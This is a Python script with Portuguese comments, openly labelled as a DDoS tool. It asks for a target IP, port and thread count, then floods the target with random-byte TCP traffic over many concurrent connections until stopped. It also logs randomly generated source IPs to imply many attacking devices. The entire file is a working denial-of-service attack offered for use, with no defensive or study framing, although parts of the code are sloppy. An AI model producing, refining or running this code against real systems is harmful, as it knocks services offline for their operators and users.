import socket
import random
import asyncio
import logging
from concurrent.futures import ThreadPoolExecutor
import sys

# Configuração de logging para feedback detalhado
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# Função para gerar IPs aleatórios simulando múltiplos dispositivos
def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# Função assíncrona para enviar pacotes TCP
async def send_packet_tcp(target_ip, target_port, packet_size, attack_id, semaphore, cancel_event):
    try:
        # Gerenciar o número de conexões simultâneas com Semaphore
        async with semaphore:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)  # Timeout de 5 segundos para a conexão
            sock.connect((target_ip, target_port))

            logging.info(f"Ataque {attack_id} iniciado de {generate_random_ip()} para {target_ip}:{target_port}")
            
            while not cancel_event.is_set():
                sock.send(random._urandom(packet_size))  # Envia pacote aleatório
                logging.debug(f"Ataque {attack_id} em andamento: {generate_random_ip()} -> {target_ip}:{target_port}")
                await asyncio.sleep(0.1)  # Intervalo entre pacotes

    except socket.timeout:
        logging.warning(f"Ataque {attack_id} falhou para {target_ip}:{target_port} - Timeout de conexão.")
    except socket.error as e:
        logging.error(f"Ataque {attack_id} falhou para {target_ip}:{target_port} - Erro: {e}")
    except asyncio.CancelledError:
        logging.info(f"Ataque {attack_id} cancelado para {target_ip}:{target_port}")
    finally:
        sock.close()

# Função principal que coordena o envio de pacotes usando múltiplas threads e async
def start_attack(target_ip, target_port, num_threads, packet_size=1024, sleep_time=0.1):
    logging.info("[*] Iniciando ataque de DDoS...")

    # Limitando o número de conexões simultâneas
    semaphore = asyncio.Semaphore(num_threads)

    loop = asyncio.get_event_loop()
    cancel_event = asyncio.Event()

    # Criando as tarefas assíncronas para enviar pacotes
    tasks = []
    for i in range(num_threads):
        task = loop.create_task(send_packet_tcp(target_ip, target_port, packet_size, i + 1, semaphore, cancel_event))
        tasks.append(task)

    try:
        loop.run_until_complete(asyncio.gather(*tasks))
    except KeyboardInterrupt:
        logging.info("Ataque interrompido pelo usuário.")
        cancel_event.set()  # Sinaliza o cancelamento de todas as tarefas
        loop.run_until_complete(asyncio.gather(*tasks))  # Aguarda as tarefas terminarem
    finally:
        logging.info("[*] Ataque concluído com sucesso!")

# Função principal que solicita entradas do usuário e inicia o ataque
def main():
    try:
        target_ip = input("Digite o IP do alvo (ex: 192.168.1.1): ")
        target_port = int(input("Digite a porta do alvo (ex: 80): "))
        num_threads = int(input("Digite o número de threads para o ataque: "))
        packet_size = int(input("Digite o tamanho do pacote (default 1024): ") or 1024)
        sleep_time = float(input("Digite o intervalo entre pacotes (em segundos, default 0.1): ") or 0.1)

        # Iniciar o ataque com os parâmetros fornecidos
        start_attack(target_ip, target_port, num_threads, packet_size, sleep_time)
        
    except ValueError:
        logging.error("Erro: Entrada inválida! Certifique-se de inserir números para a porta e o número de threads.")
        sys.exit(1)
    except KeyboardInterrupt:
        logging.info("Ataque interrompido pelo usuário.")
    except Exception as e:
        logging.error(f"Erro inesperado: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
